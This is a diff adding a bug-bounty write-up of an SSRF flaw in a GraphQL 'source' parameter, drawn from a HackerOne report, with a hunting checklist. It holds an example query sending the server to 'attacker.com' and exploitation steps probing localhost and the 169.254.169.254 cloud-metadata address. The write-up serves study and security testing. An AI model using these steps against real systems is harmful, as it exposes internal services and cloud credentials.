@@ -693,3 +693,165 @@ Main question:
 ---
 Import feature + user-controlled URL + backend download = SSRF.
 </details>
+
+---
+<details>
+<summary><b>🟡 SSRF in GraphQL `source` Parameter</b></summary>
+
+<br>
+
+**Source:** [HackerOne Report #1864188](https://hackerone.com/reports/1864188)
+
+---
+
+## 🐞 Vulnerability
+
+A GraphQL query allowed users to control the `source` parameter.
+
+The backend used this parameter to perform HTTP GET requests.
+
+Because the URL was fully controlled by the user, an attacker could force the server to send requests to arbitrary destinations.
+
+The vulnerable GraphQL query:
+
+```
+allTicks
+```
+
+contained a user-controlled parameter:
+
+```
+source
+```
+
+The application expected a predefined source, but accepted any URL.
+
+Example:
+
+```graphql
+query {
+  allTicks(
+    symbol:"TSLA",
+    source:"https://attacker.com/"
+  )
+}
+```
+
+The backend requested the attacker-controlled URL, causing an SSRF vulnerability.
+
+---
+
+## 🔍 Root Cause
+
+The application trusted user-controlled URLs without validation.
+
+Normal flow:
+
+```
+GraphQL Query
+      |
+      v
+source parameter
+      |
+      v
+Backend Request
+      |
+      v
+Trusted Source
+```
+
+Attack flow:
+
+```
+Attacker URL
+      |
+      v
+source parameter
+      |
+      v
+Backend Request
+      |
+      v
+External/Internal Service
+```
+
+---
+
+## ⚔️ Exploitation
+
+1. Find GraphQL queries containing URL parameters.
+
+Examples:
+
+```
+source
+url
+endpoint
+callback
+```
+
+2. Replace the URL with Burp Collaborator or Interactsh:
+
+```
+https://xxxxx.burpcollaborator.net
+```
+
+3. Execute the GraphQL query.
+
+4. Confirm SSRF through:
+
+```
+DNS interaction
+HTTP request
+```
+
+5. Test internal resources:
+
+```
+127.0.0.1
+localhost
+169.254.169.254
+```
+
+---
+
+## 🎯 Impact
+
+Possible impacts:
+
+- Blind SSRF
+- Internal service discovery
+- Access to internal APIs
+- Cloud metadata access
+- Potential credential exposure
+
+---
+
+## 🎯 Hunting Strategy
+
+Look for:
+
+- GraphQL fields accepting URLs
+- Webhooks
+- Import features
+- URL previews
+- External integrations
+
+Common parameters:
+
+```
+source
+url
+uri
+endpoint
+callback
+webhook
+fetch
+proxy
+```
+
+Main question:
+
+"Can I make the server send a request somewhere that I cannot access directly?"
+
+</details>
